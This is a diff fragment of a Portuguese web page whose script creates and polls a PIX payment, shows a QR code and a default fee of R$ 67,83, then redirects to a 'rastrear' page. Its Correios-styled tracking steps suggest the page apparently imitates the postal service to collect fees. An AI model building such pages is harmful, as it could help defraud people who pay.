+                    return;
+                }
+                
+                // Se não tem pagamento armazenado ou ele expirou, gera um novo
+                console.log('Gerando novo pagamento');
+                
+                // Simular processo de loading com etapas
+                setTimeout(() => {
+                    document.querySelectorAll('.correios-track-step')[0].classList.remove('active');
+                    document.querySelectorAll('.correios-track-step')[1].classList.add('active');
+                    document.getElementById('loadingMessage').textContent = "Gerando código QR para pagamento...";
+                }, 2000);
+                
+                try {
+                    // Preparar URL com todos os parâmetros da URL original
+                    let pagamentoUrl = './pagamento.php';
+                    
+                    // Passar todos os parâmetros da URL original para manter UTMs e outros parâmetros
+                    if (window.location.search) {
+                        pagamentoUrl += window.location.search;
+                    } else if (valorPagamento) {
+                        // Se não há outros parâmetros mas temos valor, usamos apenas ele
+                        pagamentoUrl += `?valor=${valorPagamento}`;
+                    }
+                    
+                    console.log('Chamando API de pagamento:', pagamentoUrl);
+                    
+                    const response = await fetch(pagamentoUrl, {
+                        method: 'GET'
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`Erro HTTP: ${response.status}`);
+                    }
+                    
+                    const data = await response.json();
+
+                    if (data.success) {
+                        // Terceira etapa do loading
+                        document.querySelectorAll('.correios-track-step')[1].classList.remove('active');
+                        document.querySelectorAll('.correios-track-step')[2].classList.add('active');
+                        document.getElementById('loadingMessage').textContent = "Pronto! Redirecionando...";
+                        
+                        // Armazenar os dados do pagamento no localStorage
+                        localStorage.setItem('pixPaymentData', JSON.stringify(data));
+                        
+                        // Definir quando expira (15 minutos a partir de agora)
+                        const expiraEm = new Date().getTime() + (15 * 60 * 1000);
+                        localStorage.setItem('pixExpiresAt', expiraEm.toString());
+                        
+                        setTimeout(() => {
+                            // Mostrar os dados do pagamento
+                            mostrarDadosPagamento(data);
+                        }, 1000);
+                    } else {
+                        // Erro ao gerar PIX
+                        console.error('Erro ao gerar PIX:', data.message);
+                        alert('Erro ao gerar o PIX: ' + data.message);
+                        loadingPage.classList.add('hidden');
+                        loginPage.classList.remove('hidden');
+                    }
+                } catch (error) {
+                    console.error('Erro:', error);
+                    alert('Ocorreu um erro ao processar sua solicitação.');
+                    loadingPage.classList.add('hidden');
+                    loginPage.classList.remove('hidden');
+                }
+            }
+
+            // Função para mostrar os dados do pagamento na interface
+            function mostrarDadosPagamento(data) {
+                // Sucesso ao gerar PIX
+                console.log('Exibindo dados do PIX:', data);
+                
+                // Iniciar o timer
+                iniciarTimer();
+                
+                // Verificar e registrar o ID do pagamento
+                const paymentId = data.paymentId || data.id || data.transaction_id;
+                console.log('ID do pagamento para verificação:', paymentId);
+                
+                if (!paymentId) {
+                    console.error('ERRO: Não foi possível identificar o ID do pagamento na resposta:', data);
+                }
+                
+                // Exibir o valor do pagamento em todos os locais
+                let valorFormatado = data.valor || "R$ 67,83";
+                
+                // Se o valor não estiver no formato moeda, formata-lo (R$ XX,XX)
+                if (typeof valorFormatado === 'number' || (typeof valorFormatado === 'string' && !valorFormatado.includes('R$'))) {
+                    // Se for um número em centavos (ex: 6783 para R$ 67,83)
+                    if (typeof valorFormatado === 'number' || !isNaN(Number(valorFormatado))) {
+                        const valorNumerico = Number(valorFormatado) / 100; // Converter centavos para reais
+                        valorFormatado = `R$ ${valorNumerico.toFixed(2).replace('.', ',')}`;
+                    } else {
+                        // Caso já esteja em formato legível mas sem o R$
+                        valorFormatado = `R$ ${valorFormatado}`;
+                    }
+                }
+                
+                document.getElementById('valorPagamentoBanner').textContent = valorFormatado;
+                document.getElementById('valorTitulo').textContent = valorFormatado;
+                
+                // Preencher QR Code
+                imagemContainer.innerHTML = `<img src="${data.qrCodeUrl}" alt="QR Code PIX" class="w-48 h-48">`;
+                
+                // Preencher código PIX
+                codigoInput.value = data.pixCopiaECola;
+                
+                // Mostrar página de pagamento
+                loadingPage.classList.add('hidden');
+                loginPage.classList.remove('hidden');
+                
+                // Configurar botão de copiar código
+                copiarCodigo.addEventListener('click', function() {
+                    navigator.clipboard.writeText(data.pixCopiaECola)
+                        .then(() => {
+                            // Mostrar notificação de copiado
+                            const notification = document.getElementById('notification');
+                            notification.classList.add('show');
+                            setTimeout(() => {
+                                notification.classList.remove('show');
+                            }, 3000);
+                        })
+                        .catch(err => {
+                            console.error('Erro ao copiar: ', err);
+                            // Alternativa para navegadores que não suportam clipboard API
+                            codigoInput.select();
+                            document.execCommand('copy');
+                            
+                            const notification = document.getElementById('notification');
+                            notification.classList.add('show');
+                            setTimeout(() => {
+                                notification.classList.remove('show');
+                            }, 3000);
+                        });
+                });
+                
+                // Configurar evento para verificar pagamento
+                if (paymentId) {
+                    verificarPagamento(paymentId);
+                }
+            }
+
+            // Função para verificar status do pagamento
+            function verificarPagamento(paymentId) {
+                console.log('[Verificação] Iniciando verificação de pagamento para ID:', paymentId);
+                
+                // Função para limpar dados do pagamento do localStorage
+                function limparDadosPagamento() {
+                    console.log('Limpando dados do pagamento armazenados');
+                    localStorage.removeItem('pixPaymentData');
+                    localStorage.removeItem('pixExpiresAt');
+                }
+                
+                // Alternativa para navegadores que não suportam fetch ou para contornar problemas de CORS
+                function verificarUsandoScriptTag() {
+                    console.log('[Verificação] Tentando verificar status usando script tag...');
+                    
+                    // Criar um ID único para callback
+                    const callbackName = 'verificacaoCallback_' + Math.random().toString(36).substring(2, 9);
+                    
+                    // Definir função global de callback
+                    window[callbackName] = function(data) {
+                        console.log('[Verificação][ScriptTag] Dados recebidos:', data);
+                        
+                        if (data.success && (data.status === 'paid' || data.status === 'approved')) {
+                            console.log('[Verificação][ScriptTag] Pagamento confirmado!');
+                            clearInterval(verificarInterval);
+                            
+                            // Limpar dados do pagamento
+                            limparDadosPagamento();
+                            
+                            // Redirecionar para página de agradecimento com o ID do pagamento
+                            window.location.href = `./rastrear/site/up01?protocolo=${encodeURIComponent(paymentId)}`;
+                        } else {
+                            console.log('[Verificação][ScriptTag] Aguardando pagamento. Status atual:', data.status);
+                        }
+                        
+                        // Limpar o callback global e remover o script
+                        delete window[callbackName];
+                        document.body.removeChild(document.getElementById(callbackName + '_script'));
+                    };
+                    
+                    // Criar e adicionar o script
+                    const script = document.createElement('script');
+                    script.id = callbackName + '_script';
+                    script.src = `./verificar.php?id=${encodeURIComponent(paymentId)}&callback=${callbackName}`;
+                    document.body.appendChild(script);
+                }
+                
+                const verificarInterval = setInterval(() => {
+                    try {
+                        console.log('[Verificação] Verificando status do pagamento...');
+                        
+                        // Tentativa principal usando fetch
+                        fetch(`./verificar.php?id=${encodeURIComponent(paymentId)}`)
+                            .then(response => {
+                                console.log('[Verificação] Status HTTP:', response.status);
+                                if (!response.ok) {
+                                    throw new Error(`Erro HTTP: ${response.status}`);
+                                }
+                                return response.text(); // Usar text() em vez de json() para verificar a resposta bruta
+                            })
+                            .then(responseText => {
+                                console.log('[Verificação] Resposta bruta:', responseText);
+                                
+                                let data;
+                                try {
+                                    data = JSON.parse(responseText);
+                                    console.log('[Verificação] Dados parseados:', data);
+                                } catch (e) {
+                                    console.error('[Verificação] Erro ao parsear JSON:', e);
+                                    // Tentar método alternativo se o parsing falhar
+                                    verificarUsandoScriptTag();
+                                    return;
+                                }
+                                
+                                if (data.success && (data.status === 'paid' || data.status === 'approved')) {
+                                    console.log('[Verificação] Pagamento confirmado!');
+                                    clearInterval(verificarInterval);
+                                    
+                                    // Limpar dados do pagamento
+                                    limparDadosPagamento();
+                                    
+                                    // Redirecionar para página de agradecimento com o ID do pagamento
+                                    window.location.href = `/rastrear/site/up01?protocolo=${encodeURIComponent(paymentId)}`;
+                                } else {
+                                    console.log('[Verificação] Aguardando pagamento. Status atual:', data.status);
+                                }
+                            })
+                            .catch(error => {
+                                console.error('[Verificação] Erro na requisição:', error);
+                                // Tentar método alternativo se o fetch falhar
+                                verificarUsandoScriptTag();
+                            });
+                    } catch (error) {
+                        console.error('[Verificação] Erro geral:', error);
+                        // Tentar método alternativo se ocorrer qualquer erro
+                        verificarUsandoScriptTag();
+                    }
+                }, 5000);
+            }
+            
+            // Configurar botão de teste para simular pagamento confirmado
+            testeConfirmacao.addEventListener('click', function() {
+                console.log('Simulando confirmação de pagamento');
+                
+                // Limpar dados do pagamento
+                localStorage.removeItem('pixPaymentData');
+                localStorage.removeItem('pixExpiresAt');
+                
+                // Gerar um protocolo para teste
+                const protocoloTeste = 'TEST-' + Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+                // Redirecionar para página de agradecimento com o protocolo de teste
+                window.location.href = `/rastrear/site/up01?protocolo=${protocoloTeste}`;
+            });
+            
+            // Iniciar geração do PIX quando a página carregar
+            gerarPix();
+            
+            // Configurar botão para regenerar o PIX
+            document.getElementById('regenerarPix').addEventListener('click', function() {
+                if (confirm('Deseja gerar um novo código PIX? O código atual será invalidado.')) {
+                    console.log('Gerando novo código PIX manualmente');
+                    // Limpar dados do pagamento atual
+                    localStorage.removeItem('pixPaymentData');
+                    localStorage.removeItem('pixExpiresAt');
+                    // Mostrar tela de loading
+                    loginPage.classList.add('hidden');
+                    loadingPage.classList.remove('hidden');
+                    // Resetar passos do loading
+                    document.querySelectorAll('.correios-track-step').forEach(step => step.classList.remove('active'));
+                    document.querySelectorAll('.correios-track-step')[0].classList.add('active');
+                    document.getElementById('loadingMessage').textContent = "Por favor, aguarde enquanto preparamos seu código de pagamento...";
+                    // Gerar novo PIX
+                    gerarPix();
+                }
+            });
+        });
+    </script>
+      <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5KFQ6RKQ"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+</body>
+</html>
